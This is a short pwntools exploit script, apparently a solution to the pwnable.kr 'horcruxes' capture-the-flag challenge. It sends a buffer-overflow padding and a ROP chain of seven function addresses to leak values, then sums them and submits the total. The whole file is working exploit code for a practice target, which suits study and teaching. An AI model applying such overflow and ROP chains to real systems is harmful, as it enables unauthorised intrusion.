#coding=utf-8
from pwn import *
context.log_level = 'debug'
r = ssh(host='pwnable.kr', user='horcruxes', password='guest', port=2222)
c = r.connect_remote('localhost', 9032)

# rop 链

A = 0x809fe4b
B = 0x809fe6a
C = 0x809fe89
D = 0x809fea8
E = 0x809fec7
F = 0x809fee6
G = 0x809ff05
ropme = 0x809fffc   # 注意这里只能是0x809fffc，也就是main里面 call ropme的地址，因为ropme这个函数所有地址都不能被返回
c.recvuntil("Select Menu:")
c.sendline('1')
c.recvuntil(' : ')
shellcode=''
# 0x78个A是因为s的地址是ebp-0x74，返回地址在ebp+4，所以需要填充0x78个A
shellcode+='A'*0x78+p32(A)+p32(B)+p32(C)+p32(D)+p32(E)+p32(F)+p32(G)+p32(ropme)
c.sendline(shellcode)
c.recvline()
sum = 0
for i in range(7):
    s = c.recvline()
    n = int(s.strip('\n').split('+')[1][:-1])
    sum += n
c.recvuntil('Menu:')
c.sendline('1')
c.recvuntil(' : ')
c.sendline(str(sum))
c.recv()
